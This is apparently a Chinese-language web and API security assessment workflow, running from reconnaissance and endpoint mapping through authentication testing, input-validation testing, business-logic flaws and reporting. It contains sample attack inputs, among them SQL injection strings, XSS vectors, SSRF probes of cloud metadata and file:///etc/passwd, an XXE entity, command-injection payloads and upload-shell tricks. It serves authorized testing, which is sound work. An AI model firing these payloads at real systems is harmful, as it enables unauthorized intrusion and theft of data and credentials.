# Web Assessment - Web/API安全评估工作流

## 完整流程图

```
目标确认 + 授权范围
    │
    ▼
┌─────────────┐
│  信息收集     │ ◄── 被动收集优先，不直接接触目标
└──────┬───────┘
       │
       ├─→ 子域名枚举 / DNS记录 / IP段 / 端口扫描
       ├─→ 指纹识别 (Wappalyzer/whatweb/builtwith)
       ├─→ 敏感文件/目录探测 (dirsearch/gobuster)
       ├─→ JS文件分析 (链接/接口/密钥提取)
       └─→ Google hacking / GitHub泄露搜索
       │
       ▼
┌─────────────┐
│  入口点映射   │ ◄── 识别所有可交互的输入面
└──────┬───────┘
       │
       ├─→ URL参数 / 路由结构
       ├─→ 表单字段 / 文件上传
       ├─→ HTTP头注入点
       ├─→ API端点 (Swagger/Postman/JS发现)
       └─→ WebSocket / GraphQL / gRPC
       │
       ▼
┌────────────────────┐
│ 认证与会话分析      │ ◄── 最关键，绕过认证=全部开放
└────────┬───────────┘
         │
         ├─→ 注册/登录逻辑缺陷
         ├─→ 密码策略 / 重置流程
         ├─→ Session管理 (Cookie/Token/JWT)
         ├─→ OAuth/OIDC配置错误
         └─→ 权限提升 (IDOR/水平/垂直越权)
         │
         ▼
┌────────────────────┐
│ 输入验证测试        │ ◄── 核心攻击面
└────────┬───────────┘
         │
         ├─→ SQL注入 (GET/POST/Header/Cookie)
         ├─→ XSS (Reflected/DOM/Stored)
         ├─→ 命令注入 / 代码注入
         ├─→ SSRF (内网探测/云元数据)
         ├─→ XXE / 模板注入 (SSTI)
         ├─→ 反序列化
         └─→ 文件上传/包含/路径遍历
         │
         ▼
┌────────────────────┐
│ 业务逻辑漏洞        │ ◄── 往往是高危但易忽略
└────────┬───────────┘
         │
         ├─→ 支付逻辑 (金额篡改/重放/竞争)
         ├─→ 工作流绕过 (步骤跳过/状态篡改)
         ├─→ 竞态条件 (TOCTOU)
         └─→ 批量操作/速率限制绕过
         │
         ▼
┌────────────────────┐
│ 验证与报告          │
└────────────────────┘
```

## Phase 1: 信息收集（被动优先）

### 1.1 基础信息收集

| 收集项 | 工具 | 输出 |
|--------|------|------|
| DNS记录 | `dig`, `subfinder`, `amass` | A/AAAA/MX/TXT/NS/CNAME |
| 子域名 | `subfinder`, `httpx`, `crt.sh` | 子域名列表 |
| IP/端口 | `nmap`, `masscan` | 开放端口+服务版本 |
| Web指纹 | Wappalyzer, whatweb, `nmap -sV` | 服务器/框架/语言/版本 |
| WHOIS/ASN | whois, ipinfo.io | 注册人/组织/IP段 |

### 1.2 敏感信息搜索

```
Google Dorking:
  site:target.com filetype:pdf | doc | xls | sql | bak | conf | env
  site:target.com inurl:admin | login | dashboard | api | debug
  site:target.com "password" OR "secret" OR "api_key" OR "token"

GitHub/GitLab:
  搜索 target.com 相关仓库
  检查 commit history 中的硬编码凭证
  检查 .env / config 文件泄露

JS文件分析:
  提取所有 .js 文件URL
  搜索 API endpoint、内部路径、密钥
  工具: LinkFinder, JSluice, SecretFinder
```

### 1.3 目录/文件探测

```bash
# 常用字典: dirb, dirbuster, SecLists
gobuster dir -u https://target.com -w /path/to/wordlist.txt -x php,html,js,json,bak,zip
# 特定目录
gobuster dir -u https://target.com/admin -w admin-dirs.txt
# API路径
gobuster dir -u https://api.target.com/v1 -w api-paths.txt
```

**重点关注**: `.git/`, `.svn/`, `.env`, `.bak`, `robots.txt`, `sitemap.xml`, `swagger.json`, `debug`, `test`, `backup`, `old`, `admin`

## Phase 2: 入口点映射

### 2.1 手动浏览与抓包

使用Burp Suite Proxy:
1. 浏览所有页面功能
2. 记录所有请求（含API调用）
3. 分类入口点：
   - 参数化请求 (GET/POST参数)
   - 文件上传点
   - 自定义Header
   - Cookie值
   - JSON/XML body字段

### 2.2 API端点发现

```
自动发现:
  - /swagger.json, /api-docs, /graphql, /openapi
  - JS文件中提取的endpoint
  - 404页面中的路径提示
  - CORS预检请求暴露的允许方法

GraphQL:
  - introspection query: {__schema{types{name fields{name}}}}
  - GraphQL Voyager 可视化

REST API:
  - OPTIONS方法探测
  - 常见路径: /api/v1/, /rest/, /internal/
```

## Phase 3: 认证与会话分析

### 3.1 登录/注册测试

| 测试项 | 方法 | 关注点 |
|--------|------|--------|
| 弱密码 | 常见密码列表 | 是否有账户锁定？提示差异？ |
| 用户名枚举 | 错误消息对比 | "用户不存在" vs "密码错误" |
| 密码重置 | Host头篡改/Token预测 | Token是否可预测？Host注入？ |
| 账户接管 | OAuth配置错误 | Open Redirect? CSRF? |
| 多因素认证 | 绕过尝试 | 备用码泄漏? 验证码爆破? |

### 3.2 会话管理

```
Session Cookie检查:
  - 属性: Secure / HttpOnly / SameSite
  - 名称: 是否暴露框架信息 (PHPSESSID, JSESSIONID)
  - 值: 长度足够? 随机性? 可预测?

JWT检查:
  - 算法: HS256/RS256/none?
  - 密钥: 弱密钥? 公钥混淆?
  - 过期: exp claims? 可接受时钟偏移?
  - 算法混淆: RS256→HS256切换?

Token刷新:
  - Refresh Token安全存储?
  - Access Token短期有效?
  - 吊销机制存在?
```

### 3.3 权限控制 (IDOR/越权)

```
水平越权:
  GET /api/user/1001 → 改为 /api/user/1002 (另一个用户)
  POST /api/order/5001 → 改为 /api/order/5002

垂直越权:
  普通用户请求 → 添加admin角色参数
  /api/user/settings → /api/admin/settings

批量验证:
  编写脚本自动化测试多个ID
  记录每个ID的响应差异
```

## Phase 4: 输入验证测试

### 4.1 SQL注入

```
测试顺序:
1. 单引号 ' → 报错? 时间延迟?
2. 逻辑判断: 1=1 / 1' or '1'='1
3. UNION SELECT: ' UNION SELECT NULL-- (逐列探测)
4. 盲注(布尔): ' AND 1=1-- / ' AND 1=2--
5. 盲注(时间): ' AND SLEEP(5)--
6. 二次注入: 先存储再取出执行

注入位置:
  - GET参数: ?id=1'
  - POST表单: 字段值
  - HTTP Header: User-Agent/Referer/X-Forwarded-For
  - Cookie: session_id=admin'
  - JSON body: {"key": "value'"}
```

### 4.2 XSS (跨站脚本)

```
反射型XSS:
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  " autofocus onfocus=alert(1) x="
  javascript:alert(1)

存储型XSS:
  个人资料/评论/帖子/日志
  检查输出上下文: HTML属性/JS字符串/URL/CSS

DOM型XSS:
  source: location.hash / location.search / postMessage
  sink: innerHTML / eval / document.write / setTimeout(string)

绕过过滤:
  大小写混合: <ScRiPt>
  编码: &#x3C;script&#x3E;
  事件处理器: onfocus/onmouseover/onload
  SVG/Math标签: <svg onload=...>
```

### 4.3 SSRF (服务端请求伪造)

```
基本测试:
  ?url=http://127.0.0.1
  ?url=http://localhost
  ?url=http://[::1]
  ?url=http://169.254.169.254 (AWS元数据)
  ?url=http://metadata.google.internal (GCP)
  ?url=file:///etc/passwd

绕过:
  @符号: http://evil.com@localhost
  DNS重绑定: 使用特殊DNS服务
  URL编码: %00, %0d%0a
  协议转换: dict://, gopher://, file://
  IPv6: [0:0:0:0:0:ffff:127.0.0.1]

云环境元数据:
  AWS: http://169.254.169.254/latest/meta-data/
  GCP: http://metadata.google.internal/computeMetadata/v1/
  Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### 4.4 文件上传

```
测试矩阵:
  扩展名: .php/.jsp/.asp/.exe → .php5/.phtml/.shtml
  MIME类型: image/jpeg → application/x-php
  内容检测: GIF89a; <?php ... ?>
  双扩展: shell.php.jpg / shell.php%00.jpg
  .htaccess: 上传自定义解析规则
  空字节截断: shell.php%00.jpg (旧版PHP)

验证:
  尝试访问上传后的文件
  检查是否返回文件内容或执行结果
  检查文件服务器响应头
```

### 4.5 其他常见输入问题

| 类型 | 测试Payload | 关键观察 |
|------|-------------|----------|
| 命令注入 | `; id`, `\| whoami`, `$(id)`, `` `id` `` | 命令执行结果 |
| XXE | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | 文件内容返回 |
| SSTI | `${7*7}`, `{{7*7}}`, `<%= 7*7 %>` | 49 = 模板渲染 |
| 路径遍历 | `../../../etc/passwd`, `..%2f..%2f` | 文件内容返回 |
| 反序列化 | PHP/Java/Python序列化对象 | 异常行为/代码执行 |

## Phase 5: 业务逻辑漏洞

### 5.1 支付/订单逻辑

```
金额篡改:
  拦截支付请求 → 修改amount参数为0.01或负数
  服务端校验? 客户端签名可伪造?

支付状态篡改:
  success → 修改为 failed 触发退款?
  pending → 直接改为 success?

重放攻击:
  同一支付请求发送两次
  Token/Nonce机制是否存在?

竞争条件:
  并发购买同一限量商品
  并发转账/提现
  使用Turbo Intruder/RaceTheWeb
```

### 5.2 工作流绕过

```
步骤跳过:
  不经过购物车直接下单
  不经过审核直接发布
  不经过邮箱验证直接登录

状态篡改:
  参数: status=pending → status=approved
  隐藏字段: step=1 → step=3
  JSON body: {"status": "draft"} → {"status": "published"}
```

## Phase 6: 验证与报告

### 6.1 每个发现的验证清单

- [ ] 可复现：从干净状态重新触发
- [ ] 影响评估：数据泄露/权限获取/RCE/DoS
- [ ] 修复建议：具体代码级修复方案
- [ ] 证据截图：请求/响应完整记录

### 6.2 严重程度参考

| 级别 | 条件 |
|------|------|
| **Critical** | RCE / SQL注入获取全库 / 任意用户接管 / 支付逻辑完全绕过 |
| **High** | 存储XSS / IDOR批量 / SSRF访问内网 / 认证完全绕过 |
| **Medium** | 反射XSS / CSRF / 信息泄露 / 中危SQL注入 |
| **Low** | 缺少安全头 / 信息披露 / 低危XSS |
| **Info** | 最佳实践建议 / 版本过旧 |

## 报告模板

```markdown
# Web安全评估报告: [目标]

## 目标信息
- URL: ...
- 测试范围: ...
- 测试日期: ...

## 发现汇总
| # | 严重程度 | 类型 | URL | 状态 |
|---|----------|------|-----|------|
| 1 | Critical | SQL注入 | /api/user?id= | 已确认 |

## 详细发现

### #1: [标题]
**严重程度**: Critical
**类型**: SQL Injection
**端点**: GET /api/user?id=[inject]
**复现步骤**:
1. ...
2. ...
**影响**: ...
**修复建议**: ...
**证据**: [截图/PoC]
```